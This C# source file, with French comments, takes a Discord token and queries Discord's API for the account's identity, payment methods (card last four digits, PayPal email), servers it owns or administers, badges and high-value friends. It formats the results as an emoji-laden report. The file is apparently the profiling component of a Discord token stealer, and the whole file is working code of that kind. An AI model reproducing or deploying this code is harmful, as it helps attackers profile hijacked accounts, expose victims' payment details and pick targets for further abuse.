using System;
using System.Collections.Generic;
using System.Net;
using Newtonsoft.Json.Linq;
using System.Linq;

namespace OdPS.Utils
{
    public static class Identity
    {
        // On retourne un objet plus riche (Détails + Avatar)
        public static (string details, string avatarUrl) GetAccountDetails(string token)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    string cleanToken = token.Trim().Replace("\"", "");
                    client.Headers.Add("Authorization", cleanToken);
                    client.Headers.Add("User-Agent", "Mozilla/5.0");

                    // 1. INFOS DE BASE ET AVATAR
                    string userJson = client.DownloadString("https://discord.com/api/v9/users/@me");
                    JObject userData = JObject.Parse(userJson);

                    string username = userData["username"].ToString();
                    string userId = userData["id"].ToString();
                    string avatarHash = userData["avatar"]?.ToString();
                    string avatarUrl = string.IsNullOrEmpty(avatarHash) ? "" : $"https://cdn.discordapp.com/avatars/{userId}/{avatarHash}.png";

                    // 2. MOYENS DE PAIEMENT (PayPal / CB)
                    string billingJson = client.DownloadString("https://discord.com/api/v9/users/@me/billing/payment-sources");
                    JArray billingData = JArray.Parse(billingJson);
                    List<string> methods = new List<string>();
                    foreach (var m in billingData)
                    {
                        if ((int)m["type"] == 1) methods.Add($"💳 CB (**** {m["last_4"]})");
                        else if ((int)m["type"] == 2) methods.Add($"🅿️ PayPal ({m["email"]})");
                    }
                    string billing = methods.Count > 0 ? string.Join("\n", methods) : "❌ Aucun";

                    // 3. SERVEURS ADMIN / OWNER
                    string guildsJson = client.DownloadString("https://discord.com/api/v9/users/@me/guilds");
                    JArray guildsData = JArray.Parse(guildsJson);
                    List<string> powers = new List<string>();
                    foreach (var g in guildsData)
                    {
                        if ((bool)g["owner"] || ((long)g["permissions"] & 0x8) == 0x8)
                            powers.Add($"• {g["name"]}");
                    }
                    string powerFinal = powers.Count > 0 ? string.Join("\n", powers.Take(4)) : "Aucun";

                    // 4. BADGES ET NITRO
                    int flags = int.Parse(userData["public_flags"]?.ToString() ?? "0");
                    string nitro = (userData["premium_type"]?.ToString() == "2") ? "Boost 💎" : "Non";

                    string res = $"👤 **User:** `{username}`\n" +
                                 $"🆔 **ID:** `{userId}`\n" +
                                 $"💎 **Nitro:** {nitro}\n" +
                                 $"💰 **Paiement:**\n{billing}\n" +
                                 $"🏅 **Badges:** {GetBadges(flags)}\n" +
                                 $"🏰 **Admin de:**\n{powerFinal}" +
                                 $"👥 **Top 5 Amis HQ:**\n{GetHQFriends(cleanToken)}"; // AJOUTE CETTE LIGNE ICI

                    return (res, avatarUrl);
                }
            }
            catch { return (null, null); }
        }
        private static string GetHQFriends(string token)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    client.Headers.Add("Authorization", token);
                    string json = client.DownloadString("https://discord.com/api/v9/users/@me/relationships");
                    JArray friends = JArray.Parse(json);

                    // Liste pour stocker (Nom, Badges, Score)
                    var hqList = new List<(string Name, string Badges, int Score)>();

                    foreach (var friend in friends)
                    {
                        var user = friend["user"];
                        int flags = (int)(user["public_flags"] ?? 0);

                        int score = 0;
                        if ((flags & 1) != 0) score += 100;      // Staff
                        if ((flags & 2) != 0) score += 90;       // Partner
                        if ((flags & 131072) != 0) score += 50;  // Dev
                        if ((flags & 512) != 0) score += 40;     // Early Supporter
                        if ((flags & 4) != 0) score += 10;       // HypeSquad Events

                        if (score > 0)
                        {
                            hqList.Add((user["username"].ToString(), GetBadges(flags), score));
                        }
                    }

                    // On trie par score décroissant et on prend les 5 meilleurs
                    var top5 = hqList.OrderByDescending(x => x.Score).Take(5).ToList();

                    if (top5.Count == 0) return "Aucun ami rare détecté ❌";

                    string result = "";
                    foreach (var f in top5)
                    {
                        result += $"⭐ `{f.Name}` ({f.Badges})\n";
                    }
                    return result;
                }
            }
            catch { return "Erreur lors du scan des amis"; }
        }

        private static string GetBadges(int flags)
        {
            List<string> b = new List<string>();
            if ((flags & 1) != 0) b.Add("Staff");
            if ((flags & 2) != 0) b.Add("Partner");
            if ((flags & 4) != 0) b.Add("HypeSquad Events");
            if ((flags & 512) != 0) b.Add("Early Supporter");
            if ((flags & 131072) != 0) b.Add("Developer");
            return b.Count > 0 ? string.Join(", ", b) : "Aucun";
        }
    }
}
